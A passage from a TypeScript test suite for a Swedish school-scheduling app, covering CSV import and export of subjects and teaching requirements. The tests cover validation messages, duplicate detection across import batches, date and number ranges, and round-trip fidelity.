    const { rows, errors } = mapSubjectRows(parseCsv(csv));

    expect(errors).toEqual([]);
    expect(rows.map((row) => row.countsTowardTimplan)).toEqual([
      true,
      true,
      true,
      true,
      true,
      true,
      false,
      false,
      false,
      false,
      false,
      null,
      null,
    ]);
  });

  it("refuses a yes/no cell it cannot read, on that row alone, naming the column", () => {
    // Sent as the text "kanske", the API's typed DTO would 400 the WHOLE
    // upload with one message for the file. Here the row is named and the
    // other rows still import.
    const { rows, errors } = mapSubjectRows(
      parseCsv("namn;undervisningstid\nMatematik;ja\nMentorstid;kanske\nBild;nej\n"),
    );

    expect(rows.map((row) => row.name)).toEqual(["Matematik", "Bild"]);
    expect(errors).toEqual([
      { row: 2, message: 'Rad 2: kolumnen "undervisningstid" ska vara ja eller nej, inte "kanske".' },
    ]);
  });

  it("keeps file order when a missing name and a bad flag both fail rows", () => {
    const { rows, errors } = mapSubjectRows(
      parseCsv("namn;undervisningstid\nMatematik;kanske\n;ja\nBild;nej\n"),
    );

    expect(rows.map((row) => row.name)).toEqual(["Bild"]);
    expect(errors.map((error) => error.row)).toEqual([1, 2]);
    expect(errors[1]?.message).toContain("namn");
  });

  it("passes the national code through verbatim and an empty cell as null", () => {
    // Case folding is the server's: it checks the code against the reference
    // table inside the writing transaction, and its 400 names the field.
    const { rows } = mapSubjectRows(
      parseCsv("namn;nationell_kod\nMatematik; ma \nKemi;KE\nMentorstid;\n"),
    );

    expect(rows.map((row) => row.nationalCode)).toEqual(["ma", "KE", null]);
  });

  it("finds the timplan columns under their English and long Swedish headers too", () => {
    const { rows, errors } = mapSubjectRows(
      parseCsv("namn;nationalCode;Räknas som undervisningstid\nMatematik;MA;nej\n"),
    );

    expect(errors).toEqual([]);
    expect(rows[0]).toMatchObject({ nationalCode: "MA", countsTowardTimplan: false });
  });

  it("requires only the name — colour and room type are optional", () => {
    const { rows, errors } = mapSubjectRows(parseCsv("namn\nBild\n"));

    expect(errors).toEqual([]);
    expect(rows[0]).toMatchObject({ name: "Bild" });
  });

  it("names the missing column when the name is absent", () => {
    const { rows, errors } = mapSubjectRows(parseCsv("kod;farg\nMA;#fff\n"));

    expect(rows).toEqual([]);
    expect(errors[0]?.message).toContain("namn");
  });

  it("exports the room type by name, never by id", () => {
    // A uuid in a spreadsheet is unreadable and unimportable — the name is
    // what the school edits and what the API resolves.
    const csv = subjectsToCsv([subject("Slöjd", "SL", "#db2777", "rt-tx")], named);

    expect(csv).toContain("Textilslöjd");
    expect(csv).not.toContain("rt-tx");
  });

  it("writes empty cells for a subject with no code, colour or room type", () => {
    const csv = subjectsToCsv([subject("Bild", null, null, null)], named);

    // The flag is NOT NULL in the database, so the export always has a word
    // for it; the national code is nullable and exports as the empty cell.
    expect(csv.trimEnd().split("\r\n").at(-1)).toBe("Bild;;;;;ja");
  });

  it("writes the flag as nej, in the word the importer reads back, never as false", () => {
    const csv = subjectsToCsv([subject("Mentorstid", "MT", null, null, null, false)], named);

    expect(csv.trimEnd().split("\r\n").at(-1)).toBe("Mentorstid;MT;;;;nej");
  });

  it("round-trips: an exported file imports back to what was exported", () => {
    const exported = subjectsToCsv(
      [
        subject("Matematik", "MA", "#4f46e5", null, "MA"),
        subject("Slöjd", "SL", "#db2777", "rt-tx", "SL"),
        subject("Kemi", null, null, "rt-lab", "KE"),
        subject("Mentorstid", "MT", null, null, null, false),
      ],
      named,
    );

    const { rows, errors } = mapSubjectRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      {
        name: "Matematik",
        code: "MA",
        color: "#4f46e5",
        roomType: "",
        nationalCode: "MA",
        countsTowardTimplan: true,
      },
      {
        name: "Slöjd",
        code: "SL",
        color: "#db2777",
        roomType: "Textilslöjd",
        nationalCode: "SL",
        countsTowardTimplan: true,
      },
      {
        name: "Kemi",
        code: "",
        color: "",
        roomType: "Laborationssal",
        nationalCode: "KE",
        countsTowardTimplan: true,
      },
      {
        name: "Mentorstid",
        code: "MT",
        color: "",
        roomType: "",
        nationalCode: null,
        countsTowardTimplan: false,
      },
    ]);
  });

  it("survives a subject name containing the delimiter", () => {
    // "Idrott; hälsa" unquoted would become two columns, and the file would
    // no longer import back — the one case plain join(';') gets wrong.
    const exported = subjectsToCsv([subject("Idrott; hälsa", "IDH", null, null)], named);
    const { rows, errors } = mapSubjectRows(parseCsv(exported));

    expect(errors).toEqual([]);
    expect(rows[0]?.name).toBe("Idrott; hälsa");
  });

  it("survives a name containing a quote", () => {
    const exported = subjectsToCsv([subject('Teknik "fördjupning"', null, null, null)], named);
    const { rows } = mapSubjectRows(parseCsv(exported));

    expect(rows[0]?.name).toBe('Teknik "fördjupning"');
  });

  it("starts the export with the BOM Excel needs for å, ä and ö", () => {
    expect(subjectsToCsv([subject("Slöjd", null, null, null)], named).startsWith("\uFEFF")).toBe(
      true,
    );
  });
});

// ---------------------------------------------------------------------------
// Teaching requirements (timplanen)
// ---------------------------------------------------------------------------

describe("teaching requirements", () => {
  const HEAD =
    "grupp;amne;lektioner_per_vecka;minuter_per_lektion;minutesBefore;minutesAfter;" +
    "larare;medlarare;veckor;fran;till\r\n";

  /**
   * A minimal well-formed file with one data row, per-cell overridable.
   *
   * The cells are addressed by their column number, which is the order HEAD
   * writes: 0 grupp, 1 amne, 2 lektioner_per_vecka, 3 minuter_per_lektion,
   * 4 minutesBefore, 5 minutesAfter, 6 larare, 7 medlarare, 8 veckor, 9 fran,
   * 10 till.
   *
   * The two minute columns are left EMPTY here rather than "0", so that nearly
   * every test below also asserts that an empty cell in a column the file has
   * reads as 0 — the file's own promise in csvImport.updatesNotDeletes.
   */
  const oneRow = (cells: Partial<Record<number, string>> = {}) => {
    const row = ["7A", "MA", "3", "60", "", "", "", "", "", "", ""];
    for (const [index, value] of Object.entries(cells)) row[Number(index)] = value!;
    return HEAD + row.join(";") + "\r\n";
  };

  /*
   * The whole file, not one request's worth.
   *
   * The API refuses a duplicate per REQUEST, and importCsvInBatches cuts the
   * file into requests. A pair either side of that cut passes both halves and
   * the second row silently overwrites the first, because the import upserts:
   * nothing errors, nothing is skipped, and one class ends up with the wrong
   * number of lessons in a subject under a report that says every row landed.
   */
  const manyRows = (pairs: [string, string][]) =>
    HEAD +
    pairs
      .map(([group, subject]) =>
        [group, subject, "3", "60", "", "", "", "", "", "", ""].join(";"),
      )
      .join("\r\n") +
    "\r\n";

  it("names both lines when the same class and subject appear twice", () => {
    const { rows, errors } = mapRequirementRows(
      parseCsv(manyRows([["7A", "MA"], ["7B", "MA"], ["7A", "MA"]])),
    );

    expect(errors).toHaveLength(1);
    expect(errors[0]?.row).toBe(3);
    expect(errors[0]?.message).toContain("rad 1");
    // The first row stands and the second is dropped, so the file cannot be
    // half-applied by whichever order the batches happen to arrive in.
    expect(rows).toHaveLength(2);
    expect(rows.map((row) => row.groupName)).toEqual(["7A", "7B"]);
  });

  it("catches a duplicate further apart than a batch is long", () => {
    // IMPORT_MAX_ROWS.requirements is 1000, and this pair straddles it — the
    // exact case the API's per-request check cannot see.
    const filler: [string, string][] = Array.from({ length: 1200 }, (_, i) => [
      `Grupp${i}`,
      "MA",
    ]);
    const { rows, errors } = mapRequirementRows(
      parseCsv(manyRows([["7A", "MA"], ...filler, ["7A", "MA"]])),
    );

    expect(errors).toHaveLength(1);
    expect(errors[0]?.row).toBe(1202);
    expect(errors[0]?.message).toContain("rad 1");
    expect(rows).toHaveLength(1201);
  });

  it("treats the pair case-insensitively, as the server does", () => {
    const { rows, errors } = mapRequirementRows(
      parseCsv(manyRows([["7a", "ma"], ["7A", "MA"]])),
    );

    expect(errors).toHaveLength(1);
    expect(rows).toHaveLength(1);
  });

  it("lets the same subject stand for two different classes", () => {
    // The guard must not fire on the ordinary shape of a timplan, where one
    // subject appears once per class down the whole file.
    const { rows, errors } = mapRequirementRows(
      parseCsv(manyRows([["7A", "MA"], ["7B", "MA"], ["7C", "MA"], ["7A", "SV"]])),
    );

    expect(errors).toEqual([]);
    expect(rows).toHaveLength(4);
  });

  /*
   * Which columns the FILE had, reported separately from the rows.
   *
   * The rows already omit a key whose column is absent, and that omission does
   * not survive the API: the ValidationPipe runs class-transformer, which
   * materialises every declared property, so the service sees the key holding
   * undefined — the same shape as a cell someone deliberately emptied. For an
   * import that overwrites those mean opposite things, so the column set has to
   * travel as data of its own.
   */
  it("reports every column the file carried", () => {
    const { columns } = mapRequirementRows(parseCsv(oneRow()));

    expect([...columns].sort()).toEqual([
      "coTeacherEmail",
      "endDate",
      "groupName",
      "lessonsPerWeek",
      "minutesAfter",
      "minutesBefore",
      "minutesPerLesson",
      "recurrence",
      "startDate",
      "subject",
      "teacherEmail",
    ]);
  });

  it("reports only the four required columns for a four-column file", () => {
    // A school's own spreadsheet: the teachers and the terms were set in the
    // app, not in Excel. Uploading it to fix a lesson count must not be read as
    // an instruction to clear five fields.
    const { rows, errors, columns } = mapRequirementRows(
      parseCsv(
        "grupp;amne;lektioner_per_vecka;minuter_per_lektion\r\n7A;MA;3;60\r\n",
      ),
    );

    expect(errors).toEqual([]);
    expect([...columns].sort()).toEqual([
      "groupName",
      "lessonsPerWeek",
      "minutesPerLesson",
      "subject",
    ]);
    // And the row leaves those keys out, which is the other half of the same
    // statement — belt and braces, since only one of the two reaches the DB.
    expect(rows[0]).not.toHaveProperty("teacherEmail");
    expect(rows[0]).not.toHaveProperty("startDate");
  });

  it("reports no columns at all when the file is missing a required one", () => {
    const { columns } = mapRequirementRows(
      parseCsv("grupp;amne\r\n7A;MA\r\n"),
    );

    expect(columns).toEqual([]);
  });

  it("ships a template that maps back through its own mapper with zero errors", () => {
    const { rows, errors } = mapRequirementRows(
      parseCsv(templateCsvContent("requirements")),
    );

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      {
        groupName: "7A",
        subject: "MA",
        lessonsPerWeek: 3,
        minutesPerLesson: 60,
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: "karin.ek@example.com",
        coTeacherEmail: null,
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 100,
        recurrence: "ALL_WEEKS",
        startDate: null,
        endDate: null,
      },
      {
        groupName: "Sl71",
        subject: "SLTX",
        lessonsPerWeek: 1,
        minutesPerLesson: 120,
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: "karin.ek@example.com",
        coTeacherEmail: "bo.alm@example.com",
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 50,
        recurrence: "ODD_WEEKS",
        startDate: null,
        endDate: null,
      },
      {
        groupName: "7A",
        subject: "SV",
        lessonsPerWeek: 2,
        minutesPerLesson: 45,
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: null,
        coTeacherEmail: null,
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 100,
        recurrence: "ALL_WEEKS",
        startDate: "2026-01-12",
        endDate: "2026-03-27",
      },
      {
        // The row the minute pair exists for: 60 minutes of idrott, with ten
        // minutes of ombyte before and twenty of dusch after that are NOT part
        // of the lesson.
        groupName: "7A",
        subject: "IDH",
        lessonsPerWeek: 2,
        minutesPerLesson: 60,
        minutesBefore: 10,
        minutesAfter: 20,
        teacherEmail: "karin.ek@example.com",
        coTeacherEmail: null,
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 100,
        recurrence: "ALL_WEEKS",
        startDate: null,
        endDate: null,
      },
    ]);
    expect(CSV_TEMPLATES.requirements.filename).toBe("timplansposter.csv");
  });

  it("names every missing required column at row 0", () => {
    const result = mapRequirementRows(parseCsv("grupp;veckor\r\n7A;alla\r\n"));

    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      {
        row: 0,
        message:
          "Kolumner saknas: amne, lektioner_per_vecka, minuter_per_lektion. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  it("reports an empty grupp or amne cell with its row number", () => {
    expect(mapRequirementRows(parseCsv(oneRow({ 0: "" }))).errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "grupp" är tom.' },
    ]);
    expect(mapRequirementRows(parseCsv(oneRow({ 1: "" }))).errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "amne" är tom.' },
    ]);
  });

  it("takes the subject written as a code and as a name, verbatim either way", () => {
    // The importer resolves both against the school's own list; the client
    // must not guess which one it was handed.
    const byCode = mapRequirementRows(parseCsv(oneRow({ 1: "SLTX" })));
    const byName = mapRequirementRows(parseCsv(oneRow({ 1: "Textilslöjd" })));

    expect(byCode.errors).toEqual([]);
    expect(byName.errors).toEqual([]);
    expect(byCode.rows[0]?.subject).toBe("SLTX");
    expect(byName.rows[0]?.subject).toBe("Textilslöjd");
  });

  it("accepts the header spellings a school would actually use", () => {
    const csv =
      "Klass;Ämne;Lektioner/vecka;Lektionslängd;Lärare;Medlärare;Veckor;Fr.o.m.;T.o.m.\r\n" +
      "7A;MA;3;60;karin@s.se;;jämna veckor;2026-01-12;2026-06-12\r\n";
    const { rows, errors } = mapRequirementRows(parseCsv(csv));

    expect(errors).toEqual([]);
    expect(rows[0]).toEqual({
      groupName: "7A",
      subject: "MA",
      lessonsPerWeek: 3,
      minutesPerLesson: 60,
      teacherEmail: "karin@s.se",
      coTeacherEmail: null,
      recurrence: "EVEN_WEEKS",
      startDate: "2026-01-12",
      endDate: "2026-06-12",
    });
  });

  describe("veckor", () => {
    const spellings: [string, string][] = [
      ["", "ALL_WEEKS"],
      ["alla", "ALL_WEEKS"],
      ["Alla veckor", "ALL_WEEKS"],
      ["varje vecka", "ALL_WEEKS"],
      ["ALL_WEEKS", "ALL_WEEKS"],
      ["udda", "ODD_WEEKS"],
      ["Udda veckor", "ODD_WEEKS"],
      ["ODD_WEEKS", "ODD_WEEKS"],
      ["jamna", "EVEN_WEEKS"],
      ["jämna", "EVEN_WEEKS"],
      ["Jämna veckor", "EVEN_WEEKS"],
      ["EVEN_WEEKS", "EVEN_WEEKS"],
    ];

    it.each(spellings)('reads "%s" as %s', (written, expected) => {
      const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 8: written })));

      expect(errors).toEqual([]);
      expect(rows[0]?.recurrence).toBe(expected);
    });

    it("falls back to ALL_WEEKS when the column is absent entirely", () => {
      const csv =
        "grupp;amne;lektioner_per_vecka;minuter_per_lektion\r\n7A;MA;3;60\r\n";
      const { rows, errors } = mapRequirementRows(parseCsv(csv));

      expect(errors).toEqual([]);
      expect(rows[0]?.recurrence).toBe("ALL_WEEKS");
    });

    it("says which words exist when it does not recognise one", () => {
      const { rows, errors } = mapRequirementRows(
        parseCsv(oneRow({ 8: "varannan vecka" })),
      );

      expect(rows).toEqual([]);
      expect(errors).toEqual([
        {
          row: 1,
          message:
            'Rad 1: veckor "varannan vecka" känns inte igen. Skriv "alla", "udda" eller "jämna", eller lämna kolumnen tom.',
        },
      ]);
    });
  });

  describe("numbers", () => {
    it("accepts both ends of the API's own range", () => {
      const low = mapRequirementRows(parseCsv(oneRow({ 2: "1", 3: "15" })));
      const high = mapRequirementRows(parseCsv(oneRow({ 2: "40", 3: "240" })));

      expect(low.errors).toEqual([]);
      expect(high.errors).toEqual([]);
      expect(low.rows[0]).toMatchObject({ lessonsPerWeek: 1, minutesPerLesson: 15 });
      expect(high.rows[0]).toMatchObject({
        lessonsPerWeek: 40,
        minutesPerLesson: 240,
      });
    });

    it.each(["0", "41", "2.5", "3,5", "abc", ""])(
      'rejects lektioner_per_vecka "%s" here rather than as a 400 later',
      (value) => {
        const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 2: value })));

        expect(rows).toEqual([]);
        expect(errors).toEqual([
          {
            row: 1,
            message: `Rad 1: lektioner_per_vecka "${value}" är inte ett heltal mellan 1 och 40.`,
          },
        ]);
      },
    );

    it.each(["14", "241", "45.5", "en timme"])(
      'rejects minuter_per_lektion "%s"',
      (value) => {
        const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 3: value })));

        expect(rows).toEqual([]);
        expect(errors).toEqual([
          {
            row: 1,
            message: `Rad 1: minuter_per_lektion "${value}" är inte ett heltal mellan 15 och 240.`,
          },
        ]);
      },
    );

    describe("the pupils' own minutes", () => {
      it("accepts both ends of the requirement's own 0..60", () => {
        const low = mapRequirementRows(parseCsv(oneRow({ 4: "0", 5: "0" })));
        const high = mapRequirementRows(parseCsv(oneRow({ 4: "60", 5: "60" })));

        expect(low.errors).toEqual([]);
        expect(high.errors).toEqual([]);
        expect(low.rows[0]).toMatchObject({ minutesBefore: 0, minutesAfter: 0 });
        expect(high.rows[0]).toMatchObject({ minutesBefore: 60, minutesAfter: 60 });
      });

      it("reads the idrott row the pair exists for", () => {
        const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 4: "10", 5: "20" })));

        expect(errors).toEqual([]);
        // The lesson is still 60 minutes long; these thirty are outside it.
        expect(rows[0]).toMatchObject({
          minutesPerLesson: 60,
          minutesBefore: 10,
          minutesAfter: 20,
        });
      });

      it("reads an EMPTY cell as 0 rather than rejecting the row", () => {
        // Unlike the two numbers above, where an empty cell is a row the API
        // would refuse. 0 is what nearly every timplan row carries, and a blank
        // cell in a column of minutes says "none".
        const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 4: "", 5: "" })));

        expect(errors).toEqual([]);
        expect(rows[0]).toMatchObject({ minutesBefore: 0, minutesAfter: 0 });
      });

      it.each(["61", "-1", "1.5", "5,5", "tio minuter"])(
        'rejects minutesBefore "%s" with the same sentence the other numbers use',
        (value) => {
          const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 4: value })));

          expect(rows).toEqual([]);
          expect(errors).toEqual([
            {
              row: 1,
              message: `Rad 1: minutesBefore "${value}" är inte ett heltal mellan 0 och 60.`,
            },
          ]);
        },
      );

      it.each(["61", "-5", "abc"])('rejects minutesAfter "%s"', (value) => {
        const { rows, errors } = mapRequirementRows(parseCsv(oneRow({ 5: value })));

        expect(rows).toEqual([]);
        expect(errors).toEqual([
          {
            row: 1,
            message: `Rad 1: minutesAfter "${value}" är inte ett heltal mellan 0 och 60.`,
          },
        ]);
      });

      it("complains once per row, about the first column that is wrong", () => {
        // The file's rule everywhere: an administrator fixes the row, and two
        // sentences about one row read as two problems.
        const { errors } = mapRequirementRows(parseCsv(oneRow({ 4: "99", 5: "99" })));

        expect(errors).toHaveLength(1);
        expect(errors[0]?.message).toContain("minutesBefore");
      });

      it("also reads the Swedish headers a hand would write", () => {
        // The template writes the API's field names; a school that adds the
        // column itself writes what the timplan page calls it.
        const csv =
          "grupp;amne;lektioner_per_vecka;minuter_per_lektion;ombyte_fore;dusch_efter\r\n" +
          "7A;IDH;2;60;10;20\r\n";
        const { rows, errors, columns } = mapRequirementRows(parseCsv(csv));

        expect(errors).toEqual([]);
        expect(rows[0]).toMatchObject({ minutesBefore: 10, minutesAfter: 20 });
        expect([...columns].sort()).toContain("minutesBefore");
      });
    });
  });

  describe("dates", () => {
    it("rejects a date that does not exist, exactly as the API would", () => {
      // 2026-02-30 is shaped like a date; new Date() rolls it to 2026-03-02.
      // Letting it through would start the period two days into March without
      // anybody being told.
      const { rows, errors } = mapRequirementRows(
        parseCsv(oneRow({ 9: "2026-02-30" })),
      );

      expect(rows).toEqual([]);
      expect(errors).toEqual([
        {
          row: 1,
          message:
            'Rad 1: fran "2026-02-30" är inte ett datum som finns. Skriv det som åååå-mm-dd.',
        },
      ]);
    });

    it.each(["2026-13-01", "12/01/2026", "2026-1-2", "2026-02-30T00:00:00Z"])(
      'rejects "%s"',
      (value) => {
        expect(mapRequirementRows(parseCsv(oneRow({ 10: value }))).errors).toEqual([
          {
            row: 1,
            message: `Rad 1: till "${value}" är inte ett datum som finns. Skriv det som åååå-mm-dd.`,
          },
        ]);
      },
    );

    it("accepts a leap day that exists and rejects the one that does not", () => {
      expect(mapRequirementRows(parseCsv(oneRow({ 9: "2028-02-29" }))).errors).toEqual(
        [],
      );
      expect(mapRequirementRows(parseCsv(oneRow({ 9: "2027-02-29" }))).errors).toHaveLength(
        1,
      );
    });

    it("rejects a period that ends before it starts", () => {
      const { rows, errors } = mapRequirementRows(
        parseCsv(oneRow({ 9: "2026-06-12", 10: "2026-01-12" })),
      );

      expect(rows).toEqual([]);
      expect(errors).toEqual([
        {
          row: 1,
          message: 'Rad 1: fran "2026-06-12" ligger efter till "2026-01-12".',
        },
      ]);
    });

    it("accepts a one-day period (from equal to till)", () => {
      const { errors } = mapRequirementRows(
        parseCsv(oneRow({ 9: "2026-01-12", 10: "2026-01-12" })),
      );

      expect(errors).toEqual([]);
    });
  });

  describe("empty cell versus absent column", () => {
    // The import UPDATES rows it recognises. null clears the teacher; leaving
    // the key out leaves the requirement's own teacher alone. A file without a
    // larare column must therefore not read as "no teacher" for every row.
    it("an empty cell in a column the file has means null — clear it", () => {
      const { rows } = mapRequirementRows(parseCsv(oneRow()));

      expect(rows[0]).toStrictEqual({
        groupName: "7A",
        subject: "MA",
        lessonsPerWeek: 3,
        minutesPerLesson: 60,
        // Empty cells in columns the file HAS. For the teachers and the dates
        // that means null — clear them — and for the minutes it means 0, which
        // is the same instruction said in the only value the column can hold.
        minutesBefore: 0,
        minutesAfter: 0,
        teacherEmail: null,
        coTeacherEmail: null,
        recurrence: "ALL_WEEKS",
        startDate: null,
        endDate: null,
      });
    });

    it("an absent column leaves the key out of the posted row entirely", () => {
      const csv =
        "grupp;amne;lektioner_per_vecka;minuter_per_lektion;veckor\r\n7A;MA;3;60;udda\r\n";
      const { rows } = mapRequirementRows(parseCsv(csv));

      expect(rows[0]).toStrictEqual({
        groupName: "7A",
        subject: "MA",
        lessonsPerWeek: 3,
        minutesPerLesson: 60,
        recurrence: "ODD_WEEKS",
      });
    });

    it("a file written before the minute columns existed does not zero them", () => {
      /*
       * The nine-column file every school that has exported its timplan once
       * already has on disk. Uploaded to fix a lesson count, it must not read as
       * "no ombyte anywhere" — which is what an always-written 0 would have
       * meant, since the import UPDATES and 0 is a legitimate value.
       *
       * Both halves of the statement are asserted: the key is absent from the
       * row, AND the column set the server writes by does not name it.
       */
      const csv =
        "grupp;amne;lektioner_per_vecka;minuter_per_lektion;larare;medlarare;veckor;fran;till\r\n" +
        "7A;IDH;2;60;karin@s.se;;alla;;\r\n";
      const { rows, errors, columns } = mapRequirementRows(parseCsv(csv));

      expect(errors).toEqual([]);
      expect(rows[0]).not.toHaveProperty("minutesBefore");
      expect(rows[0]).not.toHaveProperty("minutesAfter");
      expect(columns).not.toContain("minutesBefore");
      expect(columns).not.toContain("minutesAfter");
      // And the rest of the row still lands, so the old file remains a usable
      // file rather than a rejected one.
      expect(rows[0]).toMatchObject({ lessonsPerWeek: 2, minutesPerLesson: 60 });
    });
  });

  describe("load percentages (Fas 2)", () => {
    const PERCENT_HEAD =
      "grupp;amne;lektioner_per_vecka;minuter_per_lektion;larare;medlarare;larare_procent;medlarare_procent\r\n";

    it("reads both charges, and an empty cell as the full 100", () => {
      const { rows, errors, columns } = mapRequirementRows(
        parseCsv(PERCENT_HEAD + "Sl71;SLTX;1;120;karin@s.se;bo@s.se;;50\r\n"),
      );

      expect(errors).toEqual([]);
      expect(rows[0]).toMatchObject({ teacherLoadPercent: 100, coTeacherLoadPercent: 50 });
      expect(columns).toEqual(
        expect.arrayContaining(["teacherLoadPercent", "coTeacherLoadPercent"]),
      );
    });

    it("forgives a trailing percent sign and takes both ends of 0..200", () => {
      const { rows, errors } = mapRequirementRows(
        parseCsv(PERCENT_HEAD + "7A;MA;3;60;karin@s.se;bo@s.se;200 %;0\r\n"),
      );

      expect(errors).toEqual([]);
      expect(rows[0]).toMatchObject({ teacherLoadPercent: 200, coTeacherLoadPercent: 0 });
    });

    it("refuses a charge outside 0..200 or with a decimal, naming the column", () => {
      const { rows, errors } = mapRequirementRows(
        parseCsv(
          PERCENT_HEAD +
            "7A;MA;3;60;karin@s.se;;250;\r\n" +
            "7B;MA;3;60;karin@s.se;;;12.5\r\n",
        ),
      );

      expect(rows).toEqual([]);
      expect(errors).toEqual([
        { row: 1, message: 'Rad 1: larare_procent "250" är inte ett heltal mellan 0 och 200.' },
        {
          row: 2,
          message: 'Rad 2: medlarare_procent "12.5" är inte ett heltal mellan 0 och 200.',
        },
      ]);
    });

    it("recognises the dialog's own wording as a header", () => {
      const { rows, columns } = mapRequirementRows(
        parseCsv(
          "Grupp;Ämne;Lektioner;Minuter;Räknas för lärare (%);Räknas för medlärare (%)\r\n" +
            "7A;MA;3;60;80;40\r\n",
        ),
      );

      expect(rows[0]).toMatchObject({ teacherLoadPercent: 80, coTeacherLoadPercent: 40 });
      expect(columns).toContain("coTeacherLoadPercent");
    });

    it("leaves the stored charge alone when the file has no such column", () => {
      // The school's own four-column sheet must not reset every 50 % co-teacher
      // to 100: the import updates, so a written 100 would be an instruction.
      const { rows, columns } = mapRequirementRows(
        parseCsv("grupp;amne;lektioner_per_vecka;minuter_per_lektion\r\n7A;MA;3;60\r\n"),
      );

      expect(rows[0]).not.toHaveProperty("teacherLoadPercent");
      expect(rows[0]).not.toHaveProperty("coTeacherLoadPercent");
      expect(columns).not.toContain("teacherLoadPercent");
    });

    it("does not read a bare procent column as a charge", () => {
      // A tjänstegrad column is the likeliest "procent" in a school's own sheet.
      const { rows, columns } = mapRequirementRows(
        parseCsv("grupp;amne;lektioner;minuter;procent\r\n7A;MA;3;60;75\r\n"),
      );

      expect(rows[0]).not.toHaveProperty("teacherLoadPercent");
      expect(columns).not.toContain("teacherLoadPercent");
    });
  });

  describe("export", () => {
    const groups = [
      { id: "g-7a", name: "7A" },
      { id: "g-sl", name: "Sl71" },
    ];
    const subjects = [
      { id: "s-ma", name: "Matematik", code: "MA" },
      { id: "s-sl", name: "Textilslöjd", code: null },
      { id: "s-bl", name: "Bild", code: "   " },
    ];
    const people = [
      { id: "t-karin", email: "karin@s.se" },
      { id: "t-bo", email: "bo@s.se" },
    ];
    const requirement = (over: Partial<Parameters<typeof requirementsToCsv>[0][0]> = {}) => ({
      studentGroupId: "g-7a",
      subjectId: "s-ma",
      teacherId: null,
      coTeacherId: null,
      lessonsPerWeek: 3,
      minutesPerLesson: 60,
      minutesBefore: 0,
      minutesAfter: 0,
      teacherLoadPercent: 100,
      coTeacherLoadPercent: 100,
      recurrence: "ALL_WEEKS" as const,
      startDate: null,
      endDate: null,
      ...over,
    });

    const dataLines = (csv: string) => csv.trimEnd().split("\r\n").slice(1);

    it("writes the subject as its code, and as its name when it has none", () => {
      const csv = requirementsToCsv(
        [
          requirement(),
          requirement({ subjectId: "s-sl" }),
          requirement({ subjectId: "s-bl" }),
        ],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual([
        "7A;MA;3;60;0;0;;;alla;;;100;100",
        // A blank code is not a code: writing it would leave the ämne cell
        // empty and the row unimportable.
        "7A;Textilslöjd;3;60;0;0;;;alla;;;100;100",
        "7A;Bild;3;60;0;0;;;alla;;;100;100",
      ]);
      expect(csv).not.toContain("s-ma");
    });

    it("writes teachers as e-mail addresses and never as ids", () => {
      const csv = requirementsToCsv(
        [requirement({ teacherId: "t-karin", coTeacherId: "t-bo" })],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual(["7A;MA;3;60;0;0;karin@s.se;bo@s.se;alla;;;100;100"]);
    });

    it("writes the recurrence as the word the importer reads back", () => {
      const csv = requirementsToCsv(
        [
          requirement({ recurrence: "ODD_WEEKS" }),
          requirement({ recurrence: "EVEN_WEEKS" }),
        ],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual([
        "7A;MA;3;60;0;0;;;udda;;;100;100",
        "7A;MA;3;60;0;0;;;jamna;;;100;100",
      ]);
    });

    it("leaves the period columns blank when the requirement has no bounds", () => {
      const csv = requirementsToCsv([requirement()], groups, subjects, people);

      expect(dataLines(csv)).toEqual(["7A;MA;3;60;0;0;;;alla;;;100;100"]);
    });

    it("writes the pupils' minutes always, zeroes and all", () => {
      /*
       * Never blank, though a blank cell would import back as the same 0.
       *
       * The file is a school's working copy: every column present is a column
       * an administrator can fill in where they sit, and an empty cell in a
       * column of minutes invites the question the teacher and date columns
       * really do have — whether it means "none" or "leave it". Two zeroes
       * answer it in advance.
       */
      const csv = requirementsToCsv(
        [requirement(), requirement({ minutesBefore: 10, minutesAfter: 20 })],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual([
        "7A;MA;3;60;0;0;;;alla;;;100;100",
        "7A;MA;3;60;10;20;;;alla;;;100;100",
      ]);
    });

    it("writes each teacher's charge, so a 50 % medlärare survives the round trip", () => {
      const csv = requirementsToCsv(
        [requirement({ teacherId: "t-karin", coTeacherId: "t-bo", coTeacherLoadPercent: 50 })],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual(["7A;MA;3;60;0;0;karin@s.se;bo@s.se;alla;;;100;50"]);
      expect(mapRequirementRows(parseCsv(csv)).rows[0]).toMatchObject({
        teacherLoadPercent: 100,
        coTeacherLoadPercent: 50,
      });
    });


    it("skips a row whose group or subject it cannot name", () => {
      const csv = requirementsToCsv(
        [
          requirement(),
          requirement({ studentGroupId: "g-gone" }),
          requirement({ subjectId: "s-gone" }),
        ],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual(["7A;MA;3;60;0;0;;;alla;;;100;100"]);
    });

    it("skips a row whose teacher it cannot name rather than blanking the cell", () => {
      // A blank larare cell is not "unknown" to the importer, it is "no
      // teacher" — and since the import updates, re-uploading this file would
      // strip the teacher off the requirement.
      const csv = requirementsToCsv(
        [requirement({ teacherId: "t-gone" }), requirement({ coTeacherId: "t-gone" })],
        groups,
        subjects,
        people,
      );

      expect(dataLines(csv)).toEqual([]);
    });

    it("writes a header-only file when there is nothing to export", () => {
      expect(requirementsToCsv([], groups, subjects, people)).toBe(
        "﻿" +
